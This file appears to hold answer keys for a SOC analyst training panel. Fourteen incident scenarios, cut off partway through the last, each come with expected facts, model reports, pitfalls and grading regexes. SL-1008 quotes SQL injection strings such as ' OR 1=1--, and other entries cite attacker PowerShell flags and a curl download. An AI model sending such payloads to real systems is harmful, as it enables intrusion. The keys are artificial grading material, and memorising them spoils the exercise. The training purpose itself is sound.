// SERVER ONLY. Model reports and checks used by the "Review and improve" panel.
// Never import this from a client component. [[double brackets]] mark the key facts in model text.
export type Section = "happened" | "confirmed" | "unknown" | "next";

export type ReviewKey = {
  /** Facts a strong report names. `in` says which section they usually belong to. */
  facts: { label: string; matches: string[]; in: "happened" | "confirmed" }[];
  /** Actions a strong "next steps" section covers */
  next: { label: string; matches: string[] }[];
  model: Record<Section, string>;
  pitfalls: string[];
  /** Claims that contradict the evidence. Matched with a "not ..." guard. */
  avoid?: { pattern: string; message: string }[];
};

export const REVIEW_KEYS: Record<string, ReviewKey> = {
  "SL-1001": {
    facts: [
      { label: "the look-alike sender domain harborpine-hr.test", matches: ["harborpine-hr", "look-alike", "lookalike", "look alike", "spoof"], in: "happened" },
      { label: "d.okafor opened the link", matches: ["okafor"], in: "happened" },
      { label: "the form that was submitted to the fake page (POST)", matches: ["post", "submitted", "form", "typed", "entered"], in: "happened" },
      { label: "SPF failed and there is no DKIM", matches: ["spf"], in: "confirmed" },
      { label: "the Reply-To is a free mailbox (freemail.test)", matches: ["reply-to", "reply to", "freemail"], in: "confirmed" },
    ],
    next: [
      { label: "escalating to Level 2", matches: ["escalat", "l2", "level 2"] },
      { label: "resetting d.okafor's password and ending sessions", matches: ["reset", "password", "revoke", "disable", "secure the account"] },
      { label: "blocking the sender domain", matches: ["block", "blocklist"] },
      { label: "finding and removing the email from the other recipients", matches: ["recipient", "other staff", "other users", "purge", "delete the email", "search"] },
    ],
    model: {
      happened:
        "At 09:12 d.okafor (Accounts) received an email from payroll-update@[[harborpine-hr.test]], a look-alike of our real domain harborpine.test, asking for direct deposit details within 24 hours. At 09:14 the proxy shows d.okafor [[opened the link and submitted a form]] to the fake site (GET, then POST, from 10.20.4.37). Ten Finance and HR staff received the same email.",
      confirmed:
        "[[SPF failed]] and there is no DKIM. The Reply-To is [[payroll.help@freemail.test]], a free mailbox that has nothing to do with payroll, and our payroll never sends from outside harborpine.test. The proxy log confirms the POST to the fake page, and the mail headers show the sending address was 203.0.113.140.",
      unknown:
        "I cannot tell from the logs what d.okafor actually typed, so I have to assume login or bank details were given. I do not yet know whether anyone else among the ten recipients clicked, although the proxy only shows d.okafor so far.",
      next: "Escalate to L2 now. Please [[reset d.okafor's password]] and end open sessions, [[block harborpine-hr.test]] and 203.0.113.140 at the gateway, and [[search for and delete the email]] from the other ten mailboxes. I will ask d.okafor not to reuse that password anywhere else.",
    },
    pitfalls: [
      "Closing it because the email was only flagged. The proxy shows the user already submitted a form to the fake page.",
      "Comparing domains by eye. harborpine-hr.test looks right at a glance but is not harborpine.test.",
      "Forgetting the other nine recipients. One victim usually means a campaign.",
    ],
  },
  "SL-1002": {
    facts: [
      { label: "the sender freightline-news.test", matches: ["freightline"], in: "happened" },
      { label: "the tracking link that redirects to the vendor's own site", matches: ["tracking", "redirect", "click."], in: "happened" },
      { label: "the recipient m.silva", matches: ["silva"], in: "happened" },
      { label: "SPF and DKIM both passed", matches: ["spf", "dkim"], in: "confirmed" },
      { label: "the sender is on the approved vendor list", matches: ["vendor", "approved", "procurement"], in: "confirmed" },
      { label: "nobody clicked the link (no proxy entries)", matches: ["no click", "nobody", "no one", "no matching", "not click", "no proxy", "no entries", "no users"], in: "confirmed" },
    ],
    next: [
      { label: "closing it as a false positive with a reason", matches: ["close", "false positive"] },
      { label: "tuning the rule or allow-listing the tracking domain", matches: ["allow", "tune", "tuning", "exception", "exclude", "suppress"] },
    ],
    model: {
      happened:
        "A link-reputation rule fired on the 'October carrier rate update' email from news@[[freightline-news.test]] to [[m.silva]] because its link goes through a [[tracking address (click.freightline-news.test) that redirects]] to the vendor's own rates page.",
      confirmed:
        "[[SPF and DKIM both pass]] for the vendor's domain. freightline-news.test is on [[Procurement's approved vendor list]], was registered over six years ago, and has sent 40 weekly newsletters since January without complaints. 212 staff received the same email. The proxy search for click.freightline-news.test returned [[no matching entries]], so nobody has clicked it.",
      unknown: "Nothing that changes the call. I did not open the link myself, so the redirect target comes from the gateway data.",
      next: "Close as a false positive and record 'approved vendor newsletter, SPF/DKIM pass, no clicks'. No escalation. Suggest that the detection owner [[allow-list click.freightline-news.test]] so this vendor stops alerting every week.",
    },
    pitfalls: [
      "Calling a newsletter phishing because it has a tracking link. Tracking links are normal in marketing email.",
      "Closing without writing why. The next analyst should see 'SPF/DKIM pass, approved vendor, no clicks'.",
      "Escalating a false positive just to be safe. It wastes Level 2's time.",
    ],
    avoid: [{ pattern: "(is|was|looks like|appears to be) (an? )?(phishing|malicious)", message: "This is a normal vendor newsletter. Calling it phishing or malicious contradicts your own evidence." }],
  },
  "SL-1003": {
    facts: [
      { label: "the attacking address 203.0.113.58", matches: ["203.0.113.58"], in: "happened" },
      { label: "25 failed logins before the success", matches: ["25", "failed", "brute"], in: "happened" },
      { label: "the successful login as admin at 02:43:58", matches: ["02:43", "accepted", "success", "logged in"], in: "happened" },
      { label: "the curl download of update.sh from 198.51.100.77", matches: ["curl", "198.51.100.77", "update.sh", "download"], in: "happened" },
      { label: "web-bastion-02 holds SSH keys for 14 servers", matches: ["14", "ssh keys", "keys"], in: "confirmed" },
      { label: "MFA is off on SSH and admin normally logs in from the office only", matches: ["mfa", "office", "10.20.9", "usual"], in: "confirmed" },
    ],
    next: [
      { label: "escalating to Level 2", matches: ["escalat", "l2", "level 2"] },
      { label: "isolating web-bastion-02", matches: ["isolate", "contain", "disconnect"] },
      { label: "resetting the admin credentials and keys", matches: ["reset", "rotate", "password", "credential", "revoke"] },
      { label: "analysing the downloaded script", matches: ["script", "update.sh", "analys", "curl"] },
      { label: "checking the 14 servers it can reach", matches: ["other servers", "14", "lateral", "other hosts"] },
    ],
    model: {
      happened:
        "Between 02:41 and 02:43 [[203.0.113.58]] made 25 failed SSH logins against web-bastion-02 (10.20.1.12) using admin, root, test and ubuntu. At [[02:43:58 admin logged in successfully]] from the same address, and at 02:44:31 that session used sudo to run [[curl and download update.sh from 198.51.100.77]].",
      confirmed:
        "The auth log shows the failures and then an Accepted password line from the same IP, so the password was guessed. The admin account normally logs in only from the office range 10.20.9.0/24, and [[MFA is not enabled on SSH]] on this host. Intel lists 203.0.113.58 as a known attacker, and no other host has seen it in the last 24 hours. web-bastion-02 [[holds SSH keys for 14 internal servers]].",
      unknown:
        "I do not know what update.sh contains or whether it ran, so I cannot yet say whether the attacker used the keys on web-bastion-02 to move on to any of the 14 servers.",
      next: "Escalate now. Please [[isolate web-bastion-02]], [[reset the admin password]] and rotate the SSH keys stored on it, [[retrieve and analyse update.sh]], and look for logins on the 14 servers it can reach. I would also block 203.0.113.58 and 198.51.100.77 at the firewall.",
    },
    pitfalls: [
      "Treating the success as the real admin finally getting it right. Many failures from one outside address, then a success, is the pattern of a guessed password.",
      "Stopping at the login. The curl with sudo is what shows someone is actually working on the machine.",
      "Forgetting what the host can reach. A bastion with keys to 14 servers turns one login into 14 possible problems.",
    ],
  },
  "SL-1004": {
    facts: [
      { label: "the source 10.20.9.5 (scanner-01)", matches: ["10.20.9.5", "scanner-01", "scanner"], in: "happened" },
      { label: "100+ ports probed across 10.20.0.0/16", matches: ["port", "100", "probe", "scan"], in: "happened" },
      { label: "the alert time around 03:01", matches: ["03:0", "03:00", "03:58"], in: "happened" },
      { label: "the approved change CHG-2291", matches: ["chg-2291", "approved", "change"], in: "confirmed" },
      { label: "the activity sits inside the 03:00 to 04:00 window", matches: ["window", "03:00", "04:00", "03:58", "inside"], in: "confirmed" },
      { label: "scanner-01 is owned by Security Engineering", matches: ["security engineering", "owner", "owned"], in: "confirmed" },
    ],
    next: [
      { label: "closing it as a false positive and noting CHG-2291", matches: ["close", "false positive", "chg-2291"] },
      { label: "tuning the rule for the scanner", matches: ["exclude", "tune", "tuning", "allow", "exception", "suppress"] },
    ],
    model: {
      happened:
        "At 03:01 the firewall rule fired because [[10.20.9.5]] probed [[more than 100 ports in under a minute]] across the 10.20.0.0/16 range.",
      confirmed:
        "10.20.9.5 is [[scanner-01]], the authenticated vulnerability scanner owned by Security Engineering. The change calendar has [[CHG-2291, the approved monthly scan, window 03:00 to 04:00]], and the firewall log shows the probes starting at 03:00:04 and ending at 03:58, inside that window.",
      unknown: "Nothing that changes the call. I did not look at the scanner's own report, but the source, the time window and the owner all match the change.",
      next: "Close as a false positive and note CHG-2291. No escalation. Suggest tuning: [[exclude scanner-01 from this rule during approved scan windows]] so it does not alert every month.",
    },
    pitfalls: [
      "Escalating because a scan looks like an attack. Check who owns the source and whether a change covers it first.",
      "Not writing the change number. Without CHG-2291 the next analyst has to repeat the whole check.",
      "Forgetting the time check. The same scan at 14:00, outside the window, would be a different story.",
    ],
    avoid: [{ pattern: "(is|was|looks like|appears to be) (an? )?(attack|malicious|compromised)", message: "The scan is expected and approved. Calling it an attack contradicts your evidence." }],
  },
  "SL-1005": {
    facts: [
      { label: "FIN-WS-114 and user r.nair", matches: ["fin-ws-114", "nair"], in: "happened" },
      { label: "the destination 198.51.100.200 on a botnet command-and-control feed", matches: ["198.51.100.200", "threat feed", "threat-feed", "botnet", "c2", "command"], in: "happened" },
      { label: "a connection every 60 seconds, 131 attempts", matches: ["60 second", "every 60", "131", "beacon", "interval"], in: "happened" },
      { label: "the unsigned invoice_viewer.exe started from Downloads at 06:58", matches: ["invoice_viewer", "unsigned", "not signed", "downloads", "06:58"], in: "confirmed" },
      { label: "the 'Invoice 8841' email with a .zip at 06:49", matches: ["invoice 8841", ".zip", "zip", "06:49", "attachment"], in: "confirmed" },
      { label: "no other host has contacted the address", matches: ["no other", "other hosts", "only host", "only this"], in: "confirmed" },
    ],
    next: [
      { label: "escalating to Level 2", matches: ["escalat", "l2", "level 2"] },
      { label: "isolating FIN-WS-114", matches: ["isolate", "contain", "disconnect"] },
      { label: "collecting invoice_viewer.exe for analysis", matches: ["invoice_viewer", "hash", "analys", "sample", "collect"] },
      { label: "searching other mailboxes for the email", matches: ["mailbox", "other users", "search", "delete the email", "purge"] },
      { label: "resetting r.nair's credentials", matches: ["reset", "credential", "password"] },
    ],
    model: {
      happened:
        "[[FIN-WS-114]] (user r.nair) has tried to reach [[198.51.100.200:443]] every 60 seconds since 07:02, 131 attempts in all. The firewall blocked every one, but the destination is on a [[botnet command-and-control threat feed]]. The first attempt came four minutes after [[invoice_viewer.exe, an unsigned program, started from r.nair's Downloads folder at 06:58]].",
      confirmed:
        "The firewall log shows the steady 60-second rhythm (beaconing), and the endpoint data shows the connections come from invoice_viewer.exe, which was started by explorer.exe and is [[not signed]]. At 06:49 r.nair received [[an email 'Invoice 8841' with a .zip]] from an unknown sender and 7-Zip was opened at 06:51. No other internal host has contacted this address.",
      unknown:
        "The firewall blocked the traffic, so I do not know whether invoice_viewer.exe on FIN-WS-114 has done anything else, such as dropping more files or trying other destinations, or whether an earlier connection got through before the block.",
      next: "Escalate. Please [[isolate FIN-WS-114]], collect invoice_viewer.exe (hash 9f2c4a7d…) for analysis, [[search other mailboxes for 'Invoice 8841']] and reset r.nair's credentials as a precaution. Keep 198.51.100.200 blocked and check other hosts for it again later.",
    },
    pitfalls: [
      "Closing it because the firewall blocked it. The block hides the real problem: the computer is still infected and still trying.",
      "Missing the rhythm. One blocked connection is noise, but 131 at exactly 60 seconds is a program talking to its owner.",
      "Skipping the cause. The invoice email and the unsigned program tell Level 2 where to start.",
    ],
  },
  "SL-1006": {
    facts: [
      { label: "Candidate_CV_Final.docm opened on HR-WS-052", matches: ["docm", "candidate_cv", "hr-ws-052", "word", "winword", "macro"], in: "happened" },
      { label: "Word started PowerShell with a hidden, encoded command", matches: ["-enc", "encoded", "hidden", "base64", "-nop", "powershell"], in: "happened" },
      { label: "the download of stage2.bin from 192.0.2.88", matches: ["192.0.2.88", "stage2", "download"], in: "happened" },
      { label: "user l.fernandes", matches: ["fernandes"], in: "happened" },
      { label: "a first-time sender, jobseek-mail.test, with an SPF softfail", matches: ["jobseek", "softfail", "first time", "first-time"], in: "confirmed" },
      { label: "the EDR detected but did not block", matches: ["detected only", "not blocked", "did not block", "didn't block", "edr"], in: "confirmed" },
    ],
    next: [
      { label: "escalating to Level 2", matches: ["escalat", "l2", "level 2"] },
      { label: "isolating HR-WS-052", matches: ["isolate", "contain", "disconnect"] },
      { label: "retrieving stage2.bin and the document", matches: ["stage2", "analys", "sample", "retrieve", "collect"] },
      { label: "resetting l.fernandes's credentials", matches: ["reset", "credential", "password"] },
      { label: "blocking 192.0.2.88 and finding the same email elsewhere", matches: ["block", "other mailbox", "search", "recipient"] },
    ],
    model: {
      happened:
        "At 10:31:40 [[l.fernandes]] opened [[Candidate_CV_Final.docm]] on [[HR-WS-052]]. Four seconds later Word started [[powershell.exe with a hidden, encoded command]] (-nop -w hidden -enc), and at 10:31:47 PowerShell connected to [[192.0.2.88]], where the proxy shows a 412 KB file, [[stage2.bin]], downloaded at 10:31:49.",
      confirmed:
        "The process tree shows Outlook opened the attachment, Word ran the macro and Word started PowerShell, which Office programs do not normally do. The email came from applicant.cv@jobseek-mail.test, a [[first-time sender]] with an SPF softfail. The EDR only detected this and [[did not block it]].",
      unknown:
        "I cannot read the encoded command, so I do not know exactly what it did. I do not know what stage2.bin is or whether it has run, and I cannot tell yet whether other recruiters received the same email.",
      next: "Escalate now. Please [[isolate HR-WS-052]], retrieve stage2.bin and the document for analysis, [[reset l.fernandes's credentials]], block 192.0.2.88 and jobseek-mail.test, and search for the same email in other mailboxes.",
    },
    pitfalls: [
      "Trusting the file name. 'Candidate_CV_Final' is exactly what a recruiter expects, which is why attackers use it.",
      "Reading 'detected only' as 'handled'. The EDR logged it but did not stop it, so the download happened.",
      "Forgetting the email side. Others in HR may have received the same attachment.",
    ],
  },
  "SL-1007": {
    facts: [
      { label: "EICAR-Test-File on SEC-LAB-03", matches: ["eicar", "sec-lab-03", "test file"], in: "happened" },
      { label: "the user t.brandt", matches: ["brandt"], in: "happened" },
      { label: "the file was quarantined at 11:46", matches: ["quarantin", "11:46"], in: "happened" },
      { label: "workshop TRN-118", matches: ["trn-118", "workshop", "training"], in: "confirmed" },
      { label: "five other lab laptops had the same detection", matches: ["five", "5 other", "other lab", "same detection", "other laptops", "5 more"], in: "confirmed" },
      { label: "no process ran and there was no network activity", matches: ["no process", "no new network", "nothing ran", "did not run", "never ran", "no network"], in: "confirmed" },
    ],
    next: [
      { label: "closing it as a false positive and noting TRN-118", matches: ["close", "false positive", "trn-118"] },
      { label: "saying no escalation or rule change is needed", matches: ["no escalation", "not escalat", "no rule change", "no change needed", "nothing further"] },
    ],
    model: {
      happened:
        "At 11:46 [[t.brandt]] created the file eicar.com.txt in the Training folder on [[SEC-LAB-03]] with Notepad, and the antivirus immediately detected [[EICAR-Test-File]] and [[quarantined]] it.",
      confirmed:
        "EICAR is a 68-byte industry test string, not malware. The training calendar shows a [[security awareness workshop, TRN-118]], from 11:30 to 12:30 about how antivirus responds. t.brandt is one of six attendees and [[five other lab laptops raised the same detection]] between 11:44 and 11:52. [[No process started from the file and there were no new network connections.]]",
      unknown: "Nothing that changes the outcome. I did not look beyond the lab laptops and the 11:40 to 11:50 window.",
      next: "Close as a false positive and note TRN-118. [[No escalation and no rule change]] are needed: EICAR alerts show the antivirus is working and are quick to close.",
    },
    pitfalls: [
      "Reporting 'malware found'. EICAR is a test file and the detection is the expected result.",
      "Closing without the ticket number. Note TRN-118 so the next analyst sees the reason.",
      "Ignoring the other five laptops. Six hosts at the same time points to a class, not an infection.",
    ],
    avoid: [{ pattern: "\\b(infected|virus|malware|compromised)\\b", message: "EICAR is a harmless test file. Saying the laptop is infected or has malware contradicts the evidence." }],
  },
  "SL-1008": {
    facts: [
      { label: "the source 203.0.113.91 using sqlmap", matches: ["203.0.113.91", "sqlmap"], in: "happened" },
      { label: "14 SQL injection requests in 90 seconds", matches: ["14", "sql injection", "sqli", "payload", "or 1=1", "union"], in: "happened" },
      { label: "the target portal search page", matches: ["portal", "search"], in: "happened" },
      { label: "all requests blocked with a 403 by rule 942100", matches: ["blocked", "403", "942100", "block"], in: "confirmed" },
      { label: "nothing reached the application and there were no database errors", matches: ["did not reach", "not reach", "no sql error", "no database error", "no errors", "nothing reached", "no requests"], in: "confirmed" },
      { label: "no penetration test was booked", matches: ["pen test", "penetration", "not booked", "no scan", "no test"], in: "confirmed" },
    ],
    next: [
      { label: "saying no escalation is needed and why", matches: ["no escalation", "not escalat", "not need to escalat", "does not need", "no further"] },
      { label: "blocking or rate-limiting 203.0.113.91", matches: ["block", "rate-limit", "rate limit", "ban"] },
      { label: "watching for the address or tool returning", matches: ["watch", "monitor", "keep an eye", "return", "again"] },
    ],
    model: {
      happened:
        "Between 13:05:41 and 13:07:10, [[203.0.113.91]] sent [[14 SQL injection requests]] (such as ' OR 1=1-- and UNION SELECT) to the customer portal's /portal/search page, using the [[sqlmap]] scanning tool.",
      confirmed:
        "The WAF log shows [[all 14 blocked with a 403]] (rule 942100). The application server log has [[no requests from this address]] and the database log has [[no SQL errors]]. No penetration test is booked, so this is real hostile scanning, but it did not get through.",
      unknown:
        "I cannot tell whether the same address or tool has tried other applications, or whether it will return from another address. The portal holds customer names and addresses, which is why I will keep an eye on it.",
      next: "No escalation is needed, because the protection worked. I would [[block or rate-limit 203.0.113.91]], record the case, and watch for the same address, the sqlmap user agent or a spike in rule 942100. If any request had returned 200 with a large response, I would escalate.",
    },
    pitfalls: [
      "Calling it a false positive. The WAF fired correctly: someone really did attack the portal. The true positive is about the attacker, not about a breach.",
      "Escalating a blocked attack. Nothing reached the application, so Level 2 has nothing to do.",
      "Saying the site was hacked. The evidence says the opposite.",
    ],
    avoid: [{ pattern: "(hacked|breached|compromised|data (was )?(stolen|leaked))", message: "Nothing reached the application and the database logged no errors. Saying it was hacked or breached contradicts your evidence." }],
  },
  "SL-1009": {
    facts: [
      { label: "s.menon", matches: ["menon"], in: "happened" },
      { label: "the two sign-ins at 14:02 (Pune) and 14:14 (Frankfurt)", matches: ["14:02", "14:14", "pune", "frankfurt"], in: "happened" },
      { label: "the impossible-travel rule", matches: ["impossible", "travel", "two countries"], in: "happened" },
      { label: "both sign-ins came from the same laptop, LAP-PUN-208", matches: ["lap-pun-208", "same device", "same laptop", "same browser"], in: "confirmed" },
      { label: "192.0.2.150 is the company VPN exit (vpn-eu-01)", matches: ["vpn", "192.0.2.150", "vpn-eu-01", "exit"], in: "confirmed" },
      { label: "MFA passed and nothing unusual followed", matches: ["mfa", "no new device", "no mailbox rule", "normal", "nothing unusual", "no changes"], in: "confirmed" },
    ],
    next: [
      { label: "closing it as a false positive and noting the VPN", matches: ["close", "false positive", "vpn"] },
      { label: "tuning the rule for VPN exit addresses", matches: ["tune", "tuning", "exception", "allow", "same location", "exclude"] },
    ],
    model: {
      happened:
        "[[s.menon]] signed in at [[14:02 from Pune]] (198.51.100.34) and again at [[14:14 from Frankfurt]] (192.0.2.150). The identity rule flagged this as impossible travel.",
      confirmed:
        "Both sign-ins used the [[same laptop, LAP-PUN-208]], the same browser, and passed MFA on the registered phone. The VPN log shows s.menon connected at 14:12:30 and was assigned [[192.0.2.150, the Frankfurt VPN exit (vpn-eu-01)]]. Afterwards: normal apps only, no new device, no mailbox rule and no password or MFA changes.",
      unknown: "Nothing significant. I did not contact s.menon, because the VPN log explains the second location.",
      next: "Close as a false positive and note the VPN exit. No escalation. Suggest that the detection owner [[treat the company VPN exit addresses as the same location]] so this rule stops firing for VPN users.",
    },
    pitfalls: [
      "Trusting the location alone. A real stolen account would show a different device and odd activity afterwards, and here neither is true.",
      "Not checking the VPN log. The second address belongs to our own VPN gateway.",
      "Escalating just in case. Every unnecessary escalation costs Level 2 time.",
    ],
    avoid: [{ pattern: "(compromised|hacked|stolen|account takeover)", message: "Same device, MFA passed and a VPN exit explain this. Saying the account is compromised contradicts the evidence." }],
  },
  "SL-1010": {
    facts: [
      { label: "a.kapoor and the address 203.0.113.210", matches: ["kapoor", "203.0.113.210"], in: "happened" },
      { label: "nine MFA prompts between 22:41 and 22:48 before one was approved", matches: ["nine", "9 ", "prompts", "fatigue", "22:48", "approved"], in: "happened" },
      { label: "the new MFA device 'Pixel-x'", matches: ["pixel", "new mfa", "mfa method", "device registered", "registered a"], in: "happened" },
      { label: "the inbox rule forwarding mail to ak.backup@freemail.test", matches: ["forward", "inbox rule", "mailbox rule", "freemail", "ak.backup"], in: "happened" },
      { label: "a new country and device at night (Amsterdam, unknown Linux device)", matches: ["amsterdam", "netherlands", "unknown device", "new device", "hosting", "night", "outside working"], in: "confirmed" },
      { label: "the Contracts folder, 118 items, was opened", matches: ["contracts", "118"], in: "confirmed" },
    ],
    next: [
      { label: "escalating to Level 2", matches: ["escalat", "l2", "level 2"] },
      { label: "revoking sessions and resetting the password", matches: ["revoke", "reset", "password", "sessions"] },
      { label: "removing the new MFA device", matches: ["pixel", "mfa device", "mfa method", "remove the device", "remove the new"] },
      { label: "deleting the forwarding rule", matches: ["rule", "forward"] },
      { label: "assessing what was read or forwarded", matches: ["contracts", "assess", "forwarded", "read", "impact"] },
    ],
    model: {
      happened:
        "Between 22:41 and 22:48, [[203.0.113.210]] (Amsterdam, a hosting-provider address) triggered [[nine MFA prompts]] on [[a.kapoor]]'s account, and a.kapoor [[approved the last one at 22:48]]. Within seven minutes the attacker registered a new MFA device ([[Pixel-x]]), created an inbox rule that [[forwards mail to ak.backup@freemail.test and deletes the originals]], and opened the Contracts folder (118 items).",
      confirmed:
        "a.kapoor normally signs in from Pune between 09:00 and 18:00 IST, has never signed in from the Netherlands, and the new sign-in came from an unregistered Linux device at night. Two prompts were denied and several ignored before one was approved, which is MFA fatigue. The [[mailbox audit log]] shows the follow-up actions, including that the [[Contracts folder (118 items)]] was opened.",
      unknown:
        "I do not know how the attacker got the password in the first place. I cannot tell which of the 118 items in Contracts were read or whether anything has already been forwarded, and I have not spoken to a.kapoor yet.",
      next: "Escalate now. Please [[revoke a.kapoor's sessions]], [[reset the password and remove the Pixel-x MFA device]], delete the forwarding rule, assess what was in Contracts and what was forwarded, and block 203.0.113.210. I would also contact a.kapoor and ask them not to approve prompts they did not start.",
    },
    pitfalls: [
      "Reading 'approved by user' as 'the user is fine'. Nine prompts at night, then an approval, is the textbook sign someone gave in to the noise.",
      "Missing the persistence. A new MFA device and a forwarding rule keep the attacker in even after a password change.",
      "Stopping at the sign-in. The mailbox audit log shows what the attacker actually did.",
    ],
  },
  "SL-1011": {
    facts: [
      { label: "the bucket hp-customer-exports was made public at 16:22", matches: ["hp-customer-exports", "public", "principal *", "everyone", "16:22", "putbucketpolicy"], in: "happened" },
      { label: "the service account svc-reporting-tmp created by contractor.dev with no expiry", matches: ["svc-reporting-tmp", "contractor", "no expiry"], in: "happened" },
      { label: "the customer exports downloaded anonymously from 203.0.113.77", matches: ["203.0.113.77", "customer_export", "downloaded", "anonymous", "16:25"], in: "happened" },
      { label: "the files contain personal data (names, emails, addresses)", matches: ["personal data", "names", "emails", "addresses", "pii"], in: "confirmed" },
      { label: "no approved change, and the bucket was private for 14 months", matches: ["no approved", "private for", "did not request", "14 months", "no change"], in: "confirmed" },
    ],
    next: [
      { label: "escalating as a possible data breach", matches: ["escalat", "breach", "l2", "level 2", "incident"] },
      { label: "making the bucket private again", matches: ["private", "revert", "close the bucket", "remove public"] },
      { label: "disabling svc-reporting-tmp", matches: ["svc-reporting-tmp", "disable", "service account", "contractor"] },
      { label: "preserving the logs", matches: ["preserve", "logs", "evidence"] },
      { label: "working out who is affected", matches: ["affected", "how many", "customers", "data owner", "notify"] },
    ],
    model: {
      happened:
        "At 16:22 the service account [[svc-reporting-tmp]] (created on Oct 21 by contractor.dev from 198.51.100.155, with no expiry) changed the policy of [[hp-customer-exports]] so that [[everyone can read it]]. At 16:25 an anonymous address, [[203.0.113.77]], downloaded [[customer_export_2026-10.csv and customer_export_2026-09.csv]].",
      confirmed:
        "The bucket had been private for 14 months and there is [[no approved change]], and the reporting team says they did not ask for it. The files are tagged as containing [[personal data (names, emails, delivery addresses)]]. The access log shows two anonymous downloads of 4.2 MB and 3.9 MB, and a third anonymous read of readme.txt from 192.0.2.9.",
      unknown:
        "I do not know why the policy was changed or whether contractor.dev did it on purpose. I cannot tell whether anyone else downloaded the files before I looked, or how many customers are in the exports.",
      next: "Escalate immediately as a possible data breach. Please [[make the bucket private again]], preserve the audit and access logs, [[disable svc-reporting-tmp]] and review contractor.dev's access, work out how many customers are affected, and start the data-breach process with the data owner in Customer Operations.",
    },
    pitfalls: [
      "Treating it as a setting to fix later. The access log shows files were already downloaded, so the data has left.",
      "Forgetting the account behind it. A temporary service account with no expiry is how this happened.",
      "Guessing intent. Describe what the logs show, not whether the contractor meant it.",
    ],
  },
  "SL-1012": {
    facts: [
      { label: "j.mercer on SALES-WS-031", matches: ["mercer", "sales-ws-031"], in: "happened" },
      { label: "1.8 GB uploaded to filedrop-personal.test between 18:05 and 18:41", matches: ["1.8", "filedrop-personal", "18:05", "18:41", "upload"], in: "happened" },
      { label: "Confidential files such as Client_Pricing_Master and Key_Accounts_Contracts", matches: ["confidential", "pricing", "contracts", "client_pricing", "key_accounts"], in: "happened" },
      { label: "j.mercer gave notice on Oct 20 (last day Nov 6)", matches: ["notice", "resign", "nov 6", "leaving", "last working day", "oct 20"], in: "confirmed" },
      { label: "no approval or exception, and personal sites are not allowed", matches: ["no approval", "no exception", "not approved", "policy", "no request", "not allowed", "no data transfer"], in: "confirmed" },
      { label: "the upload was after the usual finish time of 17:30", matches: ["17:30", "after hours", "after-hours", "after the user", "finish"], in: "confirmed" },
    ],
    next: [
      { label: "escalating to the insider-risk process", matches: ["escalat", "insider", "l2", "level 2"] },
      { label: "involving HR and the manager", matches: ["hr", "manager"] },
      { label: "preserving the proxy and DLP logs", matches: ["preserve", "logs", "evidence"] },
      { label: "deciding on account or device restrictions", matches: ["restrict", "disable", "suspend", "access"] },
    ],
    model: {
      happened:
        "Between 18:05 and 18:41, [[j.mercer]] on [[SALES-WS-031]] uploaded [[1.8 GB in three uploads to filedrop-personal.test]], a personal file-sharing site. DLP matched Client_Pricing_Master.xlsx and Key_Accounts_Contracts_2026.zip, both [[labelled Confidential]], plus 212 more files, mostly Confidential.",
      confirmed:
        "The proxy log shows three POSTs of 212 MB, 640 MB and 948 MB, after j.mercer's usual finish time of 17:30. HR records show [[j.mercer gave notice on Oct 20, last working day Nov 6]]. Policy says personal file-sharing sites are not approved, and there is [[no data transfer request or exception]] on record. There are no earlier DLP alerts for this user.",
      unknown:
        "I cannot tell from these logs why the files were uploaded. There could be a work reason that has not been recorded, so I am not drawing any conclusion about intent. I have not checked whether the files are still on the site.",
      next: "Escalate to the insider-risk process. Please involve [[HR and j.mercer's manager]], [[preserve the proxy and DLP logs]], decide whether to restrict the account or the device, and ask whether the upload can be recovered or deleted. I would not contact j.mercer myself.",
    },
    pitfalls: [
      "Writing that j.mercer is stealing data. Stay neutral: describe what the logs show, not what you think they meant.",
      "Treating a large upload as normal work. Notice, after hours, a personal site and Confidential labels together are what make it serious.",
      "Contacting the user yourself. Insider cases go through HR and the manager.",
    ],
    avoid: [{ pattern: "(stealing|stole|thief|guilty|criminal|sabotag|malicious insider)", message: "Stay neutral. The logs show what was uploaded, not why. Words like 'stealing' or 'guilty' are a conclusion about intent that you cannot prove." }],
  },
  "SL-1013": {
    facts: [
      { label: "d.rossi logged on to db-prod-01 at 03:19", matches: ["rossi", "db-prod-01", "03:19"], in: "happened" },
      { label: "the service restart (net stop / net start MSSQLSERVER)", matches: ["net stop", "net start", "mssqlserver", "restart"], in: "happened" },
      { label: "why the rule fired (admin activity outside business hours)", matches: ["out-of-hours", "out of hours", "outside business", "after hours", "03:"], in: "happened" },
      { label: "incident INC-5521 (database latency)", matches: ["inc-5521", "incident", "latency"], in: "confirmed" },
      { label: "d.rossi is the on-call engineer, paged at 03:12 and acknowledged", matches: ["on-call", "on call", "rota", "paged", "acknowledg"], in: "confirmed" },
      { label: "the VPN logon with MFA approved", matches: ["vpn", "mfa"], in: "confirmed" },
    ],
    next: [
      { label: "closing it as a false positive and noting INC-5521", matches: ["close", "false positive", "inc-5521"] },
      { label: "tuning the rule for on-call engineers", matches: ["tune", "tuning", "on-call", "on call", "severity", "exception", "allow"] },
    ],
    model: {
      happened:
        "At 03:19 [[d.rossi]] logged on to [[db-prod-01]] by remote desktop, restarted the database service ([[net stop and net start MSSQLSERVER at 03:21 and 03:22]]) and logged off at 03:29. The rule fired because this is admin activity outside business hours.",
      confirmed:
        "[[INC-5521]] (Sev 2, database latency on db-prod-01) was opened at 03:09 and assigned to d.rossi, who is the [[primary on-call engineer]] until Oct 27. They were paged at 03:12 and acknowledged at 03:14. The VPN log shows d.rossi connecting from their usual laptop with [[MFA approved]] at 03:17, and the resolution note at 03:30 says the restart fixed the latency.",
      unknown: "Nothing that changes the outcome. I did not contact d.rossi, because the incident record already explains the work.",
      next: "Close as a false positive and note INC-5521. No escalation. Suggest tuning: [[lower this rule's severity when the user is the on-call engineer for an open incident]].",
    },
    pitfalls: [
      "Escalating because it is 03:00 on a production database. Check for an incident and the on-call rota first.",
      "Not recording the incident number, so the next analyst has to repeat the check.",
      "Treating every out-of-hours login as suspicious. Real engineers get paged at night.",
    ],
    avoid: [{ pattern: "(compromised|unauthori[sz]ed|hacked)", message: "An open incident, the on-call rota and an MFA login explain this. Calling it unauthorised or a compromise contradicts the evidence." }],
  },
  "SL-1014": {
    facts: [
      { label: "the IMAP sign-in from 203.0.113.140 at 11:04", matches: ["203.0.113.140", "imap", "11:04"], in: "happened" },
      { label: "legacy IMAP skips MFA", matches: ["legacy", "mfa", "not required"], in: "happened" },
      { label: "the inbox rule that hides bank and invoice mail", matches: ["inbox rule", "rule", "rss", "hide", "hidden"], in: "happened" },
